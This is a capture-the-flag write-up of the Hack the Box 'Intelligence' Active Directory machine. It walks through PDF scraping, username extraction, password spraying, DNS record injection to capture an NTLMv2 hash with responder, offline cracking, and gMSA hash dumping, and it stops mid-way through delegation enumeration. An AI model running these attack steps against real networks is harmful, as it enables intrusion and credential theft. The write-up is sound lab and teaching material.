---
title: Intelligence - Hack the Box Write-Up
published: true
image: media/intelligence/intelligence.png
---
**Difficulty**: Medium. **OS**: Windows.

This machine was a little brainfuck to me because I've never touched Active Directory stuff, but was the kick that I needed to confront more Windows machines in the future.

Let's get into it.

### Intrusion

We start as always with recognize and enumeration phase. The IP address of the victim’s machine is 10.10.10.248.

```console
elpollon@elpollon:~/HTB/Intelligence/nmap$ nmap -p- --open --min-rate=5000 -Pn -v -oG allPorts 10.10.10.248

Completed SYN Stealth Scan at 21:09, 209.72s elapsed (65535 total ports)
Nmap scan report for intelligence.htb (10.10.10.248)
Host is up (0.53s latency).
Not shown: 65515 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49666/tcp open  unknown
49691/tcp open  unknown
49692/tcp open  unknown
49702/tcp open  unknown
49714/tcp open  unknown
49853/tcp open  unknown

Read data files from: /usr/bin/../share/nmap
Nmap done: 1 IP address (1 host up) scanned in 209.87 seconds
           Raw packets sent: 131053 (5.766MB) | Rcvd: 23 (1.012KB)
```

Lot stuff open (What a great way to start with AD!). Let's enumerate the services on these ports.

```console
elpollon@elpollon:~/HTB/Intelligence/nmap$ nmap -sCV -v -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49702,49714,64360 -oN targeted 10.10.10.248

# Nmap 7.92 scan initiated Mon Oct 18 12:09:47 2021 as: nmap -sCV -v -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49691,49692,49702,49714,64360 -oN targeted 10.10.10.248
Nmap scan report for 10.10.10.248
Host is up (0.30s latency).

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-favicon: Unknown favicon MD5: 556F31ACD686989B1AFCF382C05846AA
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Intelligence
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2021-10-18 22:09:50Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021-10-18T22:11:28+00:00; +6h59m56s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2021-10-18T22:11:27+00:00; +6h59m55s from scanner time.
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-10-18T22:11:26+00:00; +6h59m56s from scanner time.
3269/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: intelligence.htb0., Site: Default-First-Site-Name)
| ssl-cert: Subject: commonName=dc.intelligence.htb
| Subject Alternative Name: othername:<unsupported>, DNS:dc.intelligence.htb
| Issuer: commonName=intelligence-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2021-04-19T00:43:16
| Not valid after:  2022-04-19T00:43:16
| MD5:   7767 9533 67fb d65d 6065 dff7 7ad8 3e88
|_SHA-1: 1555 29d9 fef8 1aec 41b7 dab2 84d7 0f9d 30c7 bde7
|_ssl-date: 2021-10-18T22:11:25+00:00; +6h59m55s from scanner time.
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
9389/tcp  open  mc-nmf        .NET Message Framing
49667/tcp open  msrpc         Microsoft Windows RPC
49691/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49692/tcp open  msrpc         Microsoft Windows RPC
49702/tcp open  msrpc         Microsoft Windows RPC
49714/tcp open  msrpc         Microsoft Windows RPC
64360/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2021-10-18T22:10:47
|_  start_date: N/A
|_clock-skew: mean: 6h59m55s, deviation: 0s, median: 6h59m54s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Oct 18 12:11:33 2021 -- 1 IP address (1 host up) scanned in 106.33 seconds
```

Microsoft IIS server on port 80, let's check it with whatweb.

```console
elpollon@elpollon:~/HTB/Intelligence$ whatweb 10.10.10.248

http://10.10.10.248 [200 OK] Bootstrap, Country[RESERVED][ZZ], Email[contact@intelligence.htb], HTML5, HTTPServer[Microsoft-IIS/10.0], IP[10.10.10.248], JQuery, Microsoft-IIS[10.0], Script, Title[Intelligence]
```

**intelligence.htb** domain was found. Let's add it to **/etc/hosts**

```console
# Host addresses
127.0.0.1   localhost
10.10.10.248    intelligence.htb
```

In the web browser, the HTTP server looks like this.

![](./media/intelligence/intelligence1.png)
![](./media/intelligence/intelligence2.png)
![](./media/intelligence/intelligence3.png)
![](./media/intelligence/intelligence4.png)

We can download 2 documents in the page. The documents are hosted in:

- intelligence.htb/documents/2020-12-15-upload.pdf
- intelligence.htb/documents/2020-01-01-upload.pdf

Let's take a quick look to these documents.


#### [](#header-4)2020-12-15-upload.pdf
![](./media/intelligence/2020-12-15.png)

#### [](#header-4)2020-01-01-upload.pdf
![](./media/intelligence/2020-01-01.png)

Nothing interesting at the moment. Let's take a look at **intelligence.htb/documents** path.

![](./media/intelligence/intelligence-documents.png)

Access denied. At this point I wrote a python script to scrape the path intelligence.htb/documents/**DOCUMENT**, with **DOCUMENT=YY/MM/DD-upload.pdf** from 2020-01-01 to 2020-12-31 if there are more files.

```python
#!/usr/bin/python3

import os
import requests
from datetime import datetime

url = 'http://intelligence.htb/documents'

delta = 86400 #Seconds in 1 day

start = int(datetime.fromisoformat('2020-01-01').timestamp())
end = int(datetime.fromisoformat('2020-12-31').timestamp())

for date in range(start, end, delta):
    document = f"{datetime.fromtimestamp(date).strftime('%Y-%m-%d')}-upload.pdf"
    res = requests.get(f'{url}/{document}')

    if res.status_code == 200:
        print(f'Document found: {document}. Downloading...')
        os.system(f'wget {url}/{document}')

print("Done.")

```
With this script I was able to download 84 documents hosted in the **/documents** path. I found 2 documents with relevant information.

#### [](#header-4)2020-06-04-upload.pdf
![](./media/intelligence/creds.png)

#### [](#header-4)2020-12-30-upload.pdf
![](./media/intelligence/IT.png)

Ok, a password and some IT information. Let's try to enumerate SMB service with anonymous login with smbclient.

```console
elpollon@elpollon:~/HTB/Intelligence$ smbclient -L intelligence.htb -N

Anonymous login successful

	Sharename       Type      Comment
	---------       ----      -------
SMB1 disabled -- no workgroup available
```

Nothing available. We have a password but at the moment we don't know any users who owns this. Time to scrape some metadata of the documents already downloaded. **pdinfo** tool is useful to this purpose.

```console
elpollon@elpollon:~/HTB/Intelligence$ pdfinfo 2020-01-01-upload.pdf

Creator:        William.Lee
Tagged:         no
UserProperties: no
Suspects:       no
Form:           none
JavaScript:     no
Pages:          1
Encrypted:      no
Page size:      612 x 792 pts (letter)
Page rot:       0
File size:      26835 bytes
Optimized:      no
PDF version:    1.5
```

**2020-01-01-upload.pdf** was created by **William.Lee** user. I have wrote a bash script to extract all users who created each document.

```bash
#!/bin/bash

files=$(ls)
users=()
echo 'Extracting users...'

for file in $files
do

  user=$(pdfinfo $file 2>/dev/null | grep "Creator" | awk '{print $2}')
  users+=$user'\n'

done

echo -e $users | sort -u > users.txt
echo 'Done, saved on users.txt'
```

Let's execute it.

```console
elpollon@elpollon:~/HTB/Intelligence$ ./extractUsers.sh

Extracting users...
Done, saved on users.txt

elpollon@elpollon:~/HTB/Intelligence$ cat users.txt

Anita.Roberts
Brian.Baker
Brian.Morris
Daniel.Shelton
Danny.Matthews
Darryl.Harris
David.Mcbride
David.Reed
David.Wilson
Ian.Duncan
Jason.Patterson
Jason.Wright
Jennifer.Thomas
Jessica.Moody
John.Coleman
Jose.Williams
Kaitlyn.Zimmerman
Kelly.Long
Nicole.Brock
Richard.Williams
Samuel.Richardson
Scott.Scott
Stephanie.Young
Teresa.Williamson
Thomas.Hall
Thomas.Valenzuela
Tiffany.Molina
Travis.Evans
Veronica.Patel
William.Lee
```

Ok, from having no potential users now we have a lot. Let's see if we got a successful login via smb with one of these users. crackmapexec suits well for this task.

```console
elpollon@elpollon:~/HTB/Intelligence$ crackmapexec smb 10.10.10.248 -u users.txt -p 'NewIntelligenceCorpUser9876'

SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [-] intelligence.htb\:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Anita.Roberts:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Baker:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Brian.Morris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Daniel.Shelton:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Danny.Matthews:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Darryl.Harris:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Mcbride:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Reed:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\David.Wilson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Ian.Duncan:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Patterson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jason.Wright:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jennifer.Thomas:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jessica.Moody:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\John.Coleman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Jose.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kaitlyn.Zimmerman:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Kelly.Long:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Nicole.Brock:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Richard.Williams:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Samuel.Richardson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Scott.Scott:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Stephanie.Young:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Teresa.Williamson:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Hall:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [-] intelligence.htb\Thomas.Valenzuela:NewIntelligenceCorpUser9876 STATUS_LOGON_FAILURE 
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Tiffany.Molina:NewIntelligenceCorpUser9876 
```

We got a successful login with **Tiffany.Molina** user. Let's see the permissions for this user in the domain with smbmap.

```console
elpollon@elpollon:~/HTB/Intelligence$ smbmap -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -H intelligence.htb -d intelligence.htb

[+] IP: intelligence.htb:445	Name: unknown                                           
        Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	NO ACCESS	Remote Admin
	C$                                                	NO ACCESS	Default share
	IPC$                                              	READ ONLY	Remote IPC
	IT                                                	READ ONLY	
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 
	Users                                             	READ ONLY	

```

We can access to some directories in the domain. At this point we should see the flag in **/Users**.

```console
elpollon@elpollon:~/HTB/Intelligence$ smbclient -U Tiffany.Molina //intelligence.htb/Users
Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                  DR        0  Sun Apr 18 21:20:26 2021
  ..                                 DR        0  Sun Apr 18 21:20:26 2021
  Administrator                       D        0  Sun Apr 18 20:18:39 2021
  All Users                       DHSrn        0  Sat Sep 15 04:21:46 2018
  Default                           DHR        0  Sun Apr 18 22:17:40 2021
  Default User                    DHSrn        0  Sat Sep 15 04:21:46 2018
  desktop.ini                       AHS      174  Sat Sep 15 04:11:27 2018
  Public                             DR        0  Sun Apr 18 20:18:39 2021
  Ted.Graves                          D        0  Sun Apr 18 21:20:26 2021
  Tiffany.Molina                      D        0  Sun Apr 18 20:51:46 2021

		3770367 blocks of size 4096. 1459158 blocks available
smb: \> cd \Tiffany.Molina\Desktop
smb: \Tiffany.Molina\Desktop\> dir
  .                                  DR        0  Sun Apr 18 20:51:46 2021
  ..                                 DR        0  Sun Apr 18 20:51:46 2021
  user.txt                           AR       34  Thu Nov  4 16:23:14 2021

		3770367 blocks of size 4096. 1458902 blocks available

```

Ok, intrusion done. We see the user's flag.

```console
smb: \Tiffany.Molina\Desktop\> get user.txt
getting file \Tiffany.Molina\Desktop\user.txt of size 34 as user.txt (0,0 KiloBytes/sec) (average 0,0 KiloBytes/sec)
smb: \Tiffany.Molina\Desktop\> exit

elpollon@elpollon:~/HTB/Intelligence$ cat user.txt
8bb12ac874f0343ec3e56ada65f928b2
```

### Privilege Escalation

The information showed on **2020-12-30-upload.pdf** tells that IT department is on processes of locking down [service accounts](https://www.comparitech.com/net-admin/active-directory-service-account/), so this could be a potential vector in privilege escalation.

Let's try to dump service acounts passwords with [gMSADumper](https://github.com/micahvandeusen/gMSADumper) using **Tifanny.Molina** credentials.

```console
elpollon@elpollon:~/HTB/Intelligence/exploits$ python3 gMSADumper.py -u Tiffany.Molina -p NewIntelligenceCorpUser9876 -d intelligence.htb

Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
```

No passwords for **Tiffany.Molina** user. Although we got a service account named **svc_int$** and the password can be read by **DC$-itsupport** groups.

Exploring more on the directories **Tiffany.Molina** user can access, I found a powershell script on **intelligence.htb/IT**.

```console
elpollon@elpollon:~/HTB/Intelligence$ smbclient -U Tiffany.Molina //intelligence.htb/IT

Enter WORKGROUP\Tiffany.Molina's password: 
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Sun Apr 18 20:50:55 2021
  ..                                  D        0  Sun Apr 18 20:50:55 2021
  downdetector.ps1                    A     1046  Sun Apr 18 20:50:55 2021

		3770367 blocks of size 4096. 1456150 blocks available
smb: \> get downdetector.ps1 
getting file \downdetector.ps1 of size 1046 as downdetector.ps1 (1,0 KiloBytes/sec) (average 1,0 KiloBytes/sec)
smb: \> exit

elpollon@elpollon:~/HTB/Intelligence$ cat downdetector.ps1

��# Check web server status. Scheduled to run every 5min
Import-Module ActiveDirectory 
foreach($record in Get-ChildItem "AD:DC=intelligence.htb,CN=MicrosoftDNS,DC=DomainDnsZones,DC=intelligence,DC=htb" | Where-Object Name -like "web*")  {
try {
$request = Invoke-WebRequest -Uri "http://$($record.Name)" -UseDefaultCredentials
if(.StatusCode -ne 200) {
Send-MailMessage -From 'Ted Graves <Ted.Graves@intelligence.htb>' -To 'Ted Graves <Ted.Graves@intelligence.htb>' -Subject "Host: $($record.Name) is down"
}
} catch {}
}
```
The script is referenced in the information contained in **2020-12-30-upload.pdf**. Doing some research to understand the script I found that every 5 minutes it sends a request to every host registered as **web\*.intelligence.htb** authenticated as user **Ted.Graves**. If the status code of some response is not equal to 200 Ted.Graves user sends an email to himself telling that the host is down.

Probably the authentication is via [NLTM](https://doubleoctopus.com/security-wiki/protocol/nt-lan-manager/). If we could modify the DNS records to create a new domain called, for example: **webdiamondjackson.intelligence.htb** that target to our IP address we could use a tool like **responder** to intercept the hash from **Ted.Graves** user used in the authentication process.

I have used [dnstool](https://github.com/dirkjanm/krbrelayx) to modify DNS records with **Tiffany.Molina** user.

```console
elpollon@elpollon:~/HTB/Intelligence/exploits$ python3 dnstool.py -u 'intelligence.htb\Tiffany.Molina' -p NewIntelligenceCorpUser9876 -a add -r webdiamondjackson.intelligence.htb -d 10.10.16.55 10.10.10.248

[-] Connecting to host...
[-] Binding to host
[+] Bind OK
/home/elpollon/HTB/Intelligence/exploits/krbrelayx/dnstool.py:241: DeprecationWarning: please use dns.resolver.Resolver.resolve() instead
  res = dnsresolver.query(zone, 'SOA')
[-] Adding new record
[+] LDAP operation completed successfully
```
If DNS records were modified at this point we should be able to intercept a hash from **Ted.Graves** user. Let's use **responder** to intercept any hash.

```console
root@elpollon:~/HTB/Intelligence/exploits$ responder -I tun0 -A

                                         __
  .----.-----.-----.-----.-----.-----.--|  |.-----.----.
  |   _|  -__|__ --|  _  |  _  |     |  _  ||  -__|   _|
  |__| |_____|_____|   __|_____|__|__|_____||_____|__|
                   |__|

           NBT-NS, LLMNR & MDNS Responder 3.0.6.0

  Author: Laurent Gaffie (laurent.gaffie@gmail.com)
  To kill this script hit CTRL-C


[+] Poisoners:
    LLMNR                      [ON]
    NBT-NS                     [ON]
    DNS/MDNS                   [ON]

[+] Servers:
    HTTP server                [ON]
    HTTPS server               [ON]
    WPAD proxy                 [OFF]
    Auth proxy                 [OFF]
    SMB server                 [ON]
    Kerberos server            [ON]
    SQL server                 [ON]
    FTP server                 [ON]
    IMAP server                [ON]
    POP3 server                [ON]
    SMTP server                [ON]
    DNS server                 [ON]
    LDAP server                [ON]
    RDP server                 [ON]
    DCE-RPC server             [ON]
    WinRM server               [ON]

[+] HTTP Options:
    Always serving EXE         [OFF]
    Serving EXE                [OFF]
    Serving HTML               [OFF]
    Upstream Proxy             [OFF]

[+] Poisoning Options:
    Analyze Mode               [ON]
    Force WPAD auth            [OFF]
    Force Basic Auth           [OFF]
    Force LM downgrade         [OFF]
    Fingerprint hosts          [OFF]

[+] Generic Options:
    Responder NIC              [tun0]
    Responder IP               [10.10.16.55]
    Challenge set              [random]
    Don't Respond To Names     ['ISATAP']

[+] Current Session Variables:
    Responder Machine Name     [WIN-B5ZFP6ZSAHS]
    Responder Domain Name      [T9SR.LOCAL]
    Responder DCE-RPC Port     [45201]
[i] Responder is in analyze mode. No NBT-NS, LLMNR, MDNS requests will be poisoned.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.16.55) is not on the same subnet than the DNS server (8.8.8.8).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.
[Analyze mode: ICMP] You can ICMP Redirect on this network.
[Analyze mode: ICMP] This workstation (10.10.16.55) is not on the same subnet than the DNS server (8.8.4.4).
[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.

[+] Listening for events...

[HTTP] Sending NTLM authentication request to 10.10.10.248
[HTTP] GET request from: 10.10.10.248     URL: / 
[HTTP] Host             : webdiamondjackson 
[HTTP] NTLMv2 Client   : 10.10.10.248
[HTTP] NTLMv2 Username : intelligence\Ted.Graves
[HTTP] NTLMv2 Hash     : Ted.Graves::intelligence:a406935a0e1d3f3e:4B3F1B9F33FC660B8243AEFAE5228B9B:0101000000000000DFDF84710BD2D70100347F9701C46D120000000002000800540039005300520001001E00570049004E002D00420035005A004600500036005A0053004100480053000400140054003900530052002E004C004F00430041004C0003003400570049004E002D00420035005A004600500036005A0053004100480053002E0054003900530052002E004C004F00430041004C000500140054003900530052002E004C004F00430041004C000800300030000000000000000000000000200000107BAF77374B8CD5D6A9D99300CE143B65A0AD76463DCADE8C00736125D86A4C0A0010000000000000000000000000000000000009004E0048005400540050002F007700650062006400690061006D006F006E0064006A00610063006B0073006F006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000
```

After almost five minutes, responder has intercepted a hash from user **Ted.Graves**. Let's try to crack it offline with **john** using rockyou.txt wordlist.

```console
elpollon@elpollon:~/HTB/Intelligence$ echo 'Ted.Graves::intelligence:a406935a0e1d3f3e:4B3F1B9F33FC660B8243AEFAE5228B9B:0101000000000000DFDF84710BD2D70100347F9701C46D120000000002000800540039005300520001001E00570049004E002D00420035005A004600500036005A0053004100480053000400140054003900530052002E004C004F00430041004C0003003400570049004E002D00420035005A004600500036005A0053004100480053002E0054003900530052002E004C004F00430041004C000500140054003900530052002E004C004F00430041004C000800300030000000000000000000000000200000107BAF77374B8CD5D6A9D99300CE143B65A0AD76463DCADE8C00736125D86A4C0A0010000000000000000000000000000000000009004E0048005400540050002F007700650062006400690061006D006F006E0064006A00610063006B0073006F006E002E0069006E00740065006C006C006900670065006E00630065002E006800740062000000000000000000' > hash.txt

elpollon@elpollon:~/HTB/Intelligence$ john hash.txt --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Mr.Teddy         (Ted.Graves)
1g 0:00:00:07 DONE (2021-11-05 14:19) 0.1315g/s 1423Kp/s 1423Kc/s 1423KC/s Mrz.deltasigma..Morgant1
Use the "--show --format=netntlmv2" options to display all of the cracked passwords reliably
Session completed
```

Let's see if the credentials **Ted.Graves:Mr.Teddy** are useful to access to the domain.

```console
elpollon@elpollon:~/HTB/Intelligence$ crackmapexec smb 10.10.10.248 -u Ted.Graves -p Mr.Teddy

SMB         10.10.10.248    445    DC               [*] Windows 10.0 Build 17763 x64 (name:DC) (domain:intelligence.htb) (signing:True) (SMBv1:False)
SMB         10.10.10.248    445    DC               [+] intelligence.htb\Ted.Graves:Mr.Teddy 
```

Cool, we got access. Now let's check if we can dump any password from **svc_int$** service account with Ted.Graves credentials.

```console
elpollon@elpollon:~/HTB/Intelligence$ python3 gMSADumper.py -u Ted.Graves -p Mr.Teddy -d intelligence.htb

Users or groups who can read password for svc_int$:
 > DC$
 > itsupport
svc_int$:::c699eaac79b69357d9dabee3379547e6
```

At this point we got the hash associated to the password of **svc_int$** service account. Let's try to crack with **rockyou**.

```console
elpollon@elpollon:~/HTB/Intelligence$ echo 'svc_int$:::c699eaac79b69357d9dabee3379547e6' > hash_svc_int

elpollon@elpollon:~/HTB/Intelligence$ john hash_svc_int --wordlist=/usr/share/wordlists/rockyou.txt

Using default input encoding: UTF-8
Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
Warning: no OpenMP support for this hash type, consider --fork=4
Press 'q' or Ctrl-C to abort, almost any other key for status
0g 0:00:00:01 DONE (2021-11-05 19:39) 0g/s 11757Kp/s 11757Kc/s 11757KC/s  _ 09..*7¡Vamos!
Session completed
```

**rockyou** wordlist was unable to crack the hash. At this point I've tried other ways to crack it with no success, so it's seems that we should play our cards in other direction.

At this point we got a service account and the hash associated. With these one could enumerate more about **svc_int$** service account if has a constrained delegation. I've used [pywerviewer](https://github.com/the-useless-one/pywerview) to this goal.

```console
elpollon@elpollon:~/HBT/Intelligence/exploits$ python3 pywerview.py get-netcomputer -u svc_int$ --hashes c699eaac79b69357d9dabee3379547e6 -t 10.10.10.248 -d intelligence.htb --full-data
ence.htb --full-data
accountexpires:                 never
badpasswordtime:                2021-11-07 20:32:46.349368
badpwdcount:                    1
cn:                             svc_int
codepage:                       0
countrycode:                    0
distinguishedname:              CN=svc_int,CN=Managed Service Accounts,DC=intelligence,DC=htb
dnshostname:                    svc_int.intelligence.htb
dscorepropagationdata:          1601-01-01 00:00:00
instancetype:                   4
iscriticalsystemobject:         FALSE
isgroup:                        False
lastlogoff:                     1600-12-31 21:00:00
lastlogon:                      1600-12-31 21:00:00
lastlogontimestamp:             2021-11-07 20:36:11.149853
localpolicyflags:               0
logoncount:                     0
msds-allowedtodelegateto:       WWW/dc.intelligence.htb
msds-groupmsamembership:        b'\x01\x00\x04\x80\x14\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00$\x00\x00\x00\x01\x02\x00\x00\x00\x00\x00\x05 \x00\x00\x00 \x02\x00\x00\x04\x00P\x00\x02\x00\x00\x00\x00\x00$\x00\xff\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00F\x86\xf1\xfat\x17\r\xcaFc\xe4\xcc\xe8\x03\x00\x00\x00\x00$\x00\xff\x01\x0f\x00\x01\x05\x00\x00\x00\x00\x00\x05\x15\x00\x00\x00F\x86\xf1\xfat\x17\r\xcaFc\xe4\xccv\x04\x00\x00'
msds-managedpasswordid:         b'\x01\x00\x00\x00KDSK\x02\x00\x00\x00h\x01\x00\x00\x06\x00\x00\x00\x18\x00\x00\x00Y\xae\x9dOD\x8fV\xbf\x92\xa5\xf4\x08.\xd6\xb6\x11\x00\x00\x00\x00"\x00\x00\x00"\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00'
msds-managedpasswordinterval:   30
msds-managedpasswordpreviousid: b'\x01\x00\x00\x00KDSK\x02\x00\x00\x00h\x01\x00\x00\x04\x00\x00\x00\x10\x00\x00\x00Y\xae\x9dOD\x8fV\xbf\x92\xa5\xf4\x08.\xd6\xb6\x11\x00\x00\x00\x00"\x00\x00\x00"\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00i\x00n\x00t\x00e\x00l\x00l\x00i\x00g\x00e\x00n\x00c\x00e\x00.\x00h\x00t\x00b\x00\x00\x00'
msds-supportedencryptiontypes:  28
name:                           svc_int
objectcategory:                 CN=ms-DS-Group-Managed-Service-Account,CN=Schema,CN=Configuration,DC=intelligence,DC=htb
objectclass:                    top,
                                person,
                                organizationalPerson,
                                user,
                                computer,
                                msDS-GroupManagedServiceAccount
objectguid:                     f180a079-f326-49b2-84a1-34824208d642
objectsid:                      S-1-5-21-4210132550-3389855604-3437519686-1144
primarygroupid:                 515
pwdlastset:                     2021-11-07 20:35:43.726051
samaccountname:                 svc_int$
samaccounttype:                 805306369
